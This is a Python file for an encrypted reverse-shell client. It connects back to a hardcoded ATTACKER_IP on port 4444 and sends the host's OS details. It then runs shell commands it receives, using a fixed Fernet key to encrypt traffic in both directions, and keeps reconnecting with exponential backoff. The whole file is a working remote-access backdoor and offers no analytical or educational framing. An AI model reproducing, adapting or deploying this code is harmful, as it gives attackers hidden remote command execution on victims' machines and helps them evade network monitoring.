import socket
import subprocess
import sys
import time
import os
import platform
from cryptography.fernet import Fernet

SECRET_KEY = b'3QnL_4-vkUB45Vfi5MwDTRSOKaaEBhPY-q5Whh4bfyo='
fernet = Fernet(SECRET_KEY)

def load_encryption_key():
    """Returns the symmetric encryption object (Fernet)"""
    return fernet

def encrypt_message(message, fernet_obj):
    """Encrypts plaintext string and returns bytes"""
    return fernet_obj.encrypt(message.encode())

def decrypt_message(ciphertext, fernet_obj):
    """Decrypts bytes and returns plaintext string"""
    return fernet_obj.decrypt(ciphertext).decode()

def connect_to_server(attacker_ip, attacker_port):
    """Creates TCP socket and connects to server"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, attacker_port))
    return s

def send_system_info(s, fernet_obj):
    """Gathers OS info and sends encrypted"""
    os_info = platform.platform()
    encrypted = encrypt_message(os_info, fernet_obj)
    s.send(encrypted)

def execute_command(cmd):
    """Executes shell command or changes directory"""
    if cmd.startswith("cd "):
        path = cmd[3:].strip()
        try:
            os.chdir(path)
            return f"Changed directory to {os.getcwd()}"
        except Exception as e:
            return f"cd failed: {e}"
    else:
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.stdout + result.stderr if result.stdout or result.stderr else "[No output]"
        except Exception as e:
            return f"Command execution failed: {e}"

def handle_server_commands(s, fernet_obj):
    """Receives, decrypts commands; executes and sends back encrypted output"""
    while True:
        encrypted_cmd = s.recv(4096)
        cmd = decrypt_message(encrypted_cmd, fernet_obj)

        if cmd.lower() == "exit":
            s.close()
            sys.exit(0)

        output = execute_command(cmd)
        encrypted_output = encrypt_message(output, fernet_obj)
        s.send(encrypted_output)

def retry_logic(max_delay=60):
    """Implements exponential backoff retry logic"""
    retry_delay = 1
    while True:
        yield retry_delay
        retry_delay = min(retry_delay * 2, max_delay)

if __name__ == "__main__":
    ATTACKER_IP = "192.168.1.66"
    ATTACKER_PORT = 4444
    fernet_obj = load_encryption_key()
    retries = retry_logic()

    while True:
        try:
            s = connect_to_server(ATTACKER_IP, ATTACKER_PORT)
            send_system_info(s, fernet_obj)
            handle_server_commands(s, fernet_obj)
        except Exception:
            delay = next(retries)
            print(f"[!] Connection failed. Retrying in {delay} seconds...")
            time.sleep(delay)
